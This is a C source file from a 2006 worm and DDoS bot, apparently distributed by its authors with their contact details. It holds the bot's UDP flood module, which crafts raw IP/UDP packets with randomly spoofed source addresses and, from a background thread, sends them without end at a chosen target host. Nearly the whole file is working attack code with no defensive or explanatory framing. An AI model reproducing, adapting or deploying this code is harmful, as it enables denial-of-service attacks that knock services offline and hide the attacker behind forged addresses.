//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
typedef struct UDP_INFO{
	char	*host;
} UDP_INFO;
//-----------------------------------------------------------------
struct udphdr {
        u_short uh_sport;        
        u_short uh_dport;
        short   uh_ulen;      
        u_short uh_sum;               
};
//-----------------------------------------------------------------
inline u_short in_cksum (u_short * addr, int len){
  
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;
	
	while(nleft > 1){
        sum += *w++;
        nleft -= 2;
    }
    if(nleft == 1){
        *(u_char *)(&answer) = *(u_char *) w;
        sum += answer;
    }
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
return (answer);
}
//-----------------------------------------------------------------
void UDP(char *dhost){
	
	struct packet{
        struct iphdr ip;
        struct udphdr udp;
	}cat;
	SOCKET	gg;
	int		ii;
	int		p1 = 0;
	int		p2 = 0;
	int		dosreps = 5;
	u_char	evil[50];
	u_long	dstaddr;
    struct	sockaddr_in dog;
	
	if(p1 > 5000){
        p1 = 5;
	}
	if(p2 < 5){
		p2 = 5000;
	}
	dstaddr = resolve((char*)dhost);
    srand(((unsigned int)time(NULL) + rand ()));
	cat.ip.ihl = 5;
	cat.ip.version = 4;
	cat.ip.tos = 0x00;
	cat.ip.tot_len = htons(sizeof(cat));
	cat.ip.id = htons(rand ());
	cat.ip.frag_off = 0;
	cat.ip.ttl = 0xff;
	cat.ip.protocol = IPPROTO_UDP;
	cat.ip.saddr = rand ();
	cat.ip.daddr = dstaddr;
	cat.ip.check = in_cksum((unsigned short *)&cat.ip, sizeof(cat.ip));
	cat.udp.uh_sport = htons(p1);
	cat.udp.uh_dport = htons(p2);
	cat.udp.uh_ulen = htons(sizeof (cat.udp) + sizeof (evil));
	cat.udp.uh_sum = in_cksum((unsigned short *)&cat.udp, sizeof(cat.udp));
	dog.sin_family = AF_INET;
	dog.sin_addr.s_addr = dstaddr;
	gg = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
	for(ii = 0; ii < dosreps; ii++){
        sendto(gg, (const char*)&cat, sizeof(cat), 0, (struct sockaddr *)&dog, sizeof(dog));
    }
	++p1;
	--p2;
}
//-----------------------------------------------------------------
DWORD WINAPI StartUDP(LPVOID param){

	UDP_INFO	udp;

	udp = *((UDP_INFO*)param);
	Sleep(100*1000);
	while(1){
		UDP(udp.host);
		Sleep(1*1000);
	}
return 1;
}
//-----------------------------------------------------------------